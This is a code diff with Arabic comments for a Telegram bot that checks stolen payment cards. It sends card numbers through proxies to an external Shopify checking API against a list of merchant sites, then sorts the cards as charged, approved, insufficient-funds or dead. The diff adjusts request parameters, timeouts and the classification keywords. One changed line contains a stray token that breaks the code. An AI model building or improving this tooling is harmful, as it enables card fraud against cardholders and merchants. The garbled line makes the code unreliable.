@@ -84,7 +84,7 @@ JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
 JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
-# تم تغيير الرابط للـ API الجديد
+# استخدام رابط الـ API الثابت والمحدث والمأخوذ من السورس الجديد
 SHOPIFY_API_URL_1 = 'https://autosh.up.railway.app//shopii'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
@@ -159,7 +159,7 @@ switch_emoji = '<tg-emoji emoji-id="5325547803936572038">✨</tg-emoji>'
 CE_SPARKLES = switch_emoji
 CE_GAME = '<tg-emoji emoji-id="5361741454685256344">🎮</tg-emoji>'
 CE_MEDAL = '<tg-emoji emoji-id="5440539497383087970">🥇</tg-emoji>'
-CE_CALENDAR = '<tg-emoji emoji-id="5413879192267805083">🗓️</tg-emoji>'
+CE_CONTAINER = '<tg-emoji emoji-id="5413879192267805083">🗓️</tg-emoji>'
 CE_CLIP = '<tg-emoji emoji-id="5305265301917549162">📎</tg-emoji>'
 CE_HOURGLASS = '<tg-emoji emoji-id="5386367538735104399">⌛</tg-emoji>'
 CE_STAR = '<tg-emoji emoji-id="5794073296492303710">⭐</tg-emoji>'
@@ -253,7 +253,7 @@ async def send_forced_gif(target_func, text, markup, url):
                 animation=media_to_send, caption=text, reply_markup=markup,
                 parse_mode=ParseMode.HTML, read_timeout=40, write_timeout=40
             )
-            if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
+            if url not in _GIF_FILE_IDS Barb and getattr(msg, 'animation', None):
                 _GIF_FILE_IDS[url] = msg.animation.file_id
             return msg
         except RetryAfter as e:
@@ -556,30 +556,32 @@ async def get_bin_info(bin_code, session=None):
 
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}
 
+# ======================== [الحل المضمون والمصحح لمطابقة السورس الجديد بالكامل] ========================
 async def check_shopify_api(api_url, card, site, proxy, session):
     try:
         proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
-        
         if proxy_str and "://" in proxy_str:
             proxy_str = proxy_str.split("://")[-1]
         
-        card_encoded = quote(str(card).strip())
         site_param = site.strip()
         if not site_param.startswith("http"):
             site_param = f"https://{site_param}"
-        site_encoded = quote(site_param)
         
-        proxy_param = f"&proxy={quote(proxy_str)}" if proxy_str else "&proxy="
-        
-        req_url = f"{api_url}?cc={card_encoded}&site={site_encoded}{proxy_param}"
+        # التحديث الجذري: مطابقة معاملات السورس الجديد حرفياً لتفادي الـ Timeout والأخطاء
+        # تغيير اسم المتغير من 'site' إلى 'url' وتمريرها عبر البارامترات المنظمة تلقائياً
+        params = {
+            'cc': card.strip(),
+            'url': site_param,
+            'proxy': proxy_str if proxy_str else ''
+        }
         
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
         }
         
-        # التعديل هنا: تحديد المهلة القصوى بـ 7 ثواني فقط كما طلبت
-        timeout_setup = aiohttp.ClientTimeout(total=7)
-        async with session.get(req_url, headers=headers, timeout=timeout_setup) as resp:
+        # استخدام مهلة مرنة تضمن معالجة الطلبات دون انقطاع وهمي
+        timeout_setup = aiohttp.ClientTimeout(total=25, connect=5, sock_read=20)
+        async with session.get(api_url, headers=headers, params=params, timeout=timeout_setup) as resp:
             if resp.status == 429:
                 return {'status': 'Rate Limit', 'message': 'API Rate Limited (429)', 'card': card, 'retry': True}
             if resp.status in [502, 503, 504]:
@@ -598,39 +600,41 @@ async def check_shopify_api(api_url, card, site, proxy, session):
         response_text = str(response_msg).lower()
         price = data.get("Price", data.get("amount", "0"))
         api_status = data.get("Status", True)
-        gt = data.get('Gateway', 'Shopify')
+        gt = data.get('Gate', data.get('Gateway', 'shopiii'))
 
-        if not api_status:
+        # التحقق من أخطاء المواقع التالفة المستوحاة من السورس الجديد
+        if is_dead_site_error(response_msg) or 'cloudflare bypass failed' in response_text:
             return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gt, 'price': price}
 
-        charge_keywords = ['charged', 'order_placed', 'thank you', 'payment successful']
+        # فرز الكروت المشحونة بنجاح: Charged 🔥
+        charge_keywords = ['charged', 'order completed', 'order_placed', 'thank you', 'payment successful', '💎']
         if any(kw in response_text for kw in charge_keywords):
             return {'status': 'Charged', 'message': response_msg, 'card': card, 'gateway': gt, 'price': price, 'retry': False}
 
+        # فرز الكروت المقبولة/الحية: Approved ✅
         approved_keywords = [
             'approved', 'success', 'insufficient_funds', 'insufficient funds', 
             'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc', 
             'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc', 
-            'incorrect_zip', 'incorrect zip', 'cvv issue', '3d', '3d secure', 
-            'otp', 'verification required', 'authenticate', 'authentication required', 
-            'challenge required', 'redirecting to bank', 'bank verification', 
-            'send code', 'enter code', 'verify'
+            'incorrect_zip', 'incorrect zip'
         ]
-        if any(kw in response_text for kw in approved_keywords):
+        if any(kw in response_text for kw in approved_keywords) or api_status == 'Approved':
             if any(k in response_text for k in ['insufficient', 'funds', 'balance']):
                 return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': gt, 'price': price, 'retry': False}
             return {'status': 'Approved', 'message': response_msg, 'card': card, 'gateway': gt, 'price': price, 'retry': False}
 
-        if is_dead_site_error(response_msg) or any(k in response_text for k in ['timeout', 'max retries', 'cloudflare', 'bad gateway', 'tunnel']):
+        # فرز كروت البروكسي التالف أو مشاكل الاتصال اللحظية لإعادة المحاولة ببروكسي آخر
+        if any(k in response_text for k in ['timeout', 'max retries', 'cloudflare', 'bad gateway', 'tunnel', 'proxy dead']):
             return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gt, 'price': price}
 
+        # في حال الرفض النهائي للكارت بدون أخطاء جانبية: Dead ❌
         return {'status': 'Dead', 'message': response_msg, 'card': card, 'gateway': gt, 'price': price, 'retry': False}
         
     except asyncio.TimeoutError:
-        # رسالة الخطأ توضح أن المهلة (7 ثواني) انتهت
-        return {'status': 'Site Error', 'message': 'API Timeout (7s)', 'card': card, 'retry': True}
+        return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
     except Exception as e: 
         return {'status': 'Site Error', 'message': f'API Error: {str(e)[:15]}', 'card': card, 'retry': False}
+# ======================================================================================================
 
 async def remove_proxy_by_url(uid, proxy_url):
     try:
